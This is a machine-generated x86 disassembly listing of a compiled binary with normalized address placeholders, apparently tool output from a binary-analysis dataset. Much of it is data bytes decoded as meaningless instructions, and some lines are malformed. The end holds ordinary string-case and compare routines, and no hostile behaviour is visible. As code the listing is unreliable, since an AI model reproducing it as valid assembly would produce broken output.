add [ eax ] al
add [ eax ] al
add ah bl
outsd
inc eax
add [ eax ] dl
add [ eax ] al
add [ edi + ebp * 2 ] dh
inc eax
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xf4004030
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ edi + 0x40 ] 0x0
adc [ eax ] al
add [ eax ] al
int3
outsd
outsb
sub [ edi + 0x40 ] 0x0
add [ eax ] al
nop
jo r-xdata
lea eax [ eax ]
cmp [ eax + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add ah cl
outsb
inc eax
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004070 ] dl
add [ eax ] dl
add [ eax ] al
add ah cl
outsb
inc eax
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ ebx ] cl
inc ebp
dec ecx
outsb
dec edi
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x71 ] cl
inc eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
jo r-xdata
inc ebp
jb r-xdata
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004071 ] ah
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
jno r-xdata
popad
insb
mov eax eax
call sub_40b111
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 2 + 0x40 ] al
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x1040b131
outsd
jb r-xdata
add al bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
inc eax
add [ edx ] cl
inc ebp
inc esp
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
clc
jno r-xdata
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
add [ eax ] al
add ah bh
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + esi * 2 + 0x40 ] al
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ ecx ] cl
inc ebp
dec ecx
outsb
je r-xdata
mov bh 0x40
add [ ecx + esi ] dl
inc eax
add [ eax * 2 + 0x4f74754f ] cl
dec bp
insd
outsd
jb r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
jb r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add ah bh
jo r-xdata
xor [ eax ] al
adc al 0x31
inc eax
add [ edx ] dl
inc ebp
inc ebp
js r-xdata
inc eax
add al bl
shl [ eax + 0x4071 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
xor [ eax ] al
adc al 0x31
inc eax
add [ ecx ] cl
inc ebp
inc ebp
js r-xdata
add al bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + esi * 2 + 0x40 ] al
dec edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 + 0x100040 ] ch
add [ eax ] al
inc esp
jo r-xdata
jbe r-xdata
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x72 ] dl
inc eax
add [ eax ] dl
add [ eax ] al
add ah bh
jo r-xdata
xor [ eax ] al
adc al 0x31
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x10004071 ]
imul ebp [ edi + 0x6e ] 0x40714890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x40735c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
jae r-xdata
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
xor [ eax ] al
adc al 0x31
add al bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 ] al
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edx ] cl
inc ebp
dec ebp
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 2 ] cl
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x72 ] ah
inc eax
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edx ] cl
inc ebp
push ebp
outsb
jb r-xdata
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
add [ eax ] al
inc esp
imul esi [ esi + 0x69 ] 0x73b46564
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 + 0x100040 ] dh
add [ eax ] al
pushad
jb r-xdata
add [ eax ] dl
add [ eax ] al
add [ eax + 0x72 ] ah
inc eax
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 + 0x40 ] bl
outsd
jb r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x72 ] ah
inc eax
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edx ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x73
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ eax + eax * 2 ] 0xc
add [ eax ] al
add ah cl
outsb
inc eax
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
jb r-xdata
inc eax
add [ eax * 2 + 0x4f746e49 ] cl
fdiv [ eax ]
inc eax
add [ ecx + esi ] dl
add al 0x73
inc eax
add [ eax ] al
inc eax
add [ ebx ] cl
inc ebp
push edx
popad
outsb
inc ebp
jb r-xdata
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
inc eax
add [ edx + esi * 2 + 0x40 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ ecx ] cl
inc ebp
dec edi
jbe r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
je r-xdata
add [ eax ] dl
add [ eax ] al
add [ edi + ebp * 2 ] dh
inc eax
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xf4004030
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
outsd
ja r-xdata
mov bh 0x40
add [ ecx + esi ] dl
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add ah dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi * 2 + 0xc0040 ] bl
add [ eax + eax ] cl
add [ eax ] al
int3
jae r-xdata
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
inc eax
add [ ebx ] cl
inc ebp
pop edx
jb r-xdata
inc eax
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
ror [ esp + esi * 2 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x75 ] bh
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + esi * 2 + 0x40 ] al
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ eax ] dl
inc ebp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
lea eax [ eax ]
sbb al 0x75
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 2 + 0x40 ] ah
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
jbe r-xdata
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
outsb
lea eax [ eax ]
fdiv [ ebp + 0x40 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
jne r-xdata
xor [ eax ] al
adc al 0x31
inc eax
add [ eax * 2 + 0x61766e49 ] cl
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add [ esi * 2 + 0x40 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x75
inc eax
add [ eax + eax ] cl
add al bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 + 0x100040 ] cl
add [ eax ] al
inc esp
jo r-xdata
add [ eax ] dl
add [ eax ] al
add [ eax + esi * 2 + 0x40 ] al
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ esi ] cl
inc ebp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + esi * 2 + 0x40 ] al
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
jbe r-xdata
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ ecx ] cl
inc ebp
inc ebx
outsd
outsb
je r-xdata
mov eax eax
in al 0x76
inc eax
add [ eax ] al
add [ eax ] al
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x77 ] al
inc eax
add [ eax + eax ] cl
add [ eax ] al
int3
outsd
insb
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
nop
xor [ esi + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x76
inc eax
insb
outsd
ja r-xdata
inc eax
add [ edx ] cl
inc ebp
push eax
jb r-xdata
fdiv [ eax ]
inc eax
add [ ecx + esi ] dl
sub_407643
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 + 0x100040 ] cl
add [ eax ] al
inc esp
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
jbe r-xdata
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ ecx ] cl
inc ebp
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x77 ] al
inc eax
add [ eax + eax ] cl
add [ eax ] al
int3
outsd
insb
inc ebx
mov eax eax
in al 0x76
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4077d9
outsb
inc eax
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x78
inc eax
add [ eax + eax ] cl
add [ eax ] al
int3
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004078 ] dh
add [ eax ] al
add ah cl
outsb
inc eax
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
adc al 0x31
inc eax
add [ esi ] cl
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
pop eax
js r-xdata
aam 0xe9
add [ eax + eax ] al
add [ eax + 0x6c004010 ] bh
add [ eax ] al
add [ eax ] al
jns r-xdata
imul ebp [ edi + 0x6e ] 0x4078c890
add [ ecx ] dl
add ebp [ esi ]
aaa
xor al 0x4
add [ eax ] al
add [ eax + edx + r--data ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
add al bl
xor [ eax ] al
adc al 0x31
inc eax
add [ eax ] cl
inc ebp
dec edi
push ebx
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
imul edx [ edi ] 0x0
add eax 0xffffffd4
jmp sub_40d158
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
add [ ecx + edi * 2 + 0x40 ] ah
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x78 ] bl
inc eax
add [ eax ] dl
add [ eax ] al
add ah cl
outsb
inc eax
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
jb r-xdata
lodsb [ esi ]
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x53080040 ] ch
jns r-xdata
outsd
jb r-xdata
loopne r-xdata
je r-xdata
add [ ebx ] dl
push esp
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ ebx + esi + 0x40 ] dh
insb
jae r-xdata
adc [ ebp + 0x41 ] al
jae r-xdata
cld
ja r-xdata
je r-xdata
push ebp
inc eax
add [ esi ] cl
inc ebp
dec ecx
outsb
je r-xdata
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
inc eax
add [ eax + 0x4078 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x4079b83f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
jpe r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr ah 0x78
inc eax
add [ ecx ] dl
add ebp [ esi ]
cmp [ esp + eax ] dh
add [ eax ] al
add [ eax + edx + r--data ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
xor [ eax ] al
adc al 0x31
add al bl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
add eax 0xffffffd4
jmp sub_40d000
add [ eax + esi + 0x30d80040 ] bh
inc eax
add al dl
int 0x40
inc eax
xor ecx ecx
outsb
imul edi [ edx + 0x65 ] r-xdata
add al bl
xor [ eax ] al
je r-xdata
add ah dl
jns r-xdata
xor eax [ eax ]
js r-xdata
add eax 0xffffffd4
jmp sub_40d0ec
xor [ eax ] al
ror ch 0x1
inc eax
add al bl
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
mov al [ 0x4077 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004077 ] ah
add [ eax ] al
add ah cl
outsb
inc eax
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7a ] al
inc eax
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x336c0040 ] ch
inc eax
add [ eax ] bl
push esi
inc eax
add [ esi + edx * 2 ] ah
inc eax
add [ eax + 0x74004033 ] al
xor eax [ eax ]
xor al 0x56
inc eax
inc eax
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
add [ edi + ecx * 8 + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
stosd [ edi ]
cmp al 0x0
add al ch
idiv [ ebp + 0x5e5fffff ]
je r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edx ] dl
inc ebp
push ebx
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
sar bh 0xff
pop ebx
retn
call sub_40b760
call sub_4038b0
pop edi
pop esi
push edx
popad
inc ebp
js r-xdata
insb
jne r-xdata
mov eax ebx
call sub_4026e4
mov esi eax
mov eax esi
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
mov edx ebx
call sub_402b40
mov eax esi
pop esi
pop ebx
retn
dec [ ebx + 0x33c68bf0 ]
leave
arpl [ eax + 0x72 ] bp
outsd
sub_407a68
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407a9c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_4038b0
pop edi
pop esi
pop ebx
retn
sub_407ac0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026e4
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402b40
mov eax esi
pop esi
pop ebx
retn
sub_407ae0
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_402704
call ebx
pop ebx
retn
sub_407b0c
push ebx
mov ebx eax
mov eax 0xc
call sub_4026e4
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407ae0
pop ebx
retn
sub_407b44
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4041b8
mov ebx eax
mov eax edi
mov edx ebx
call sub_404544
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407b80
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4041b8
mov ebx eax
mov eax edi
mov edx ebx
call sub_404544
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407bbc
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407bec
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
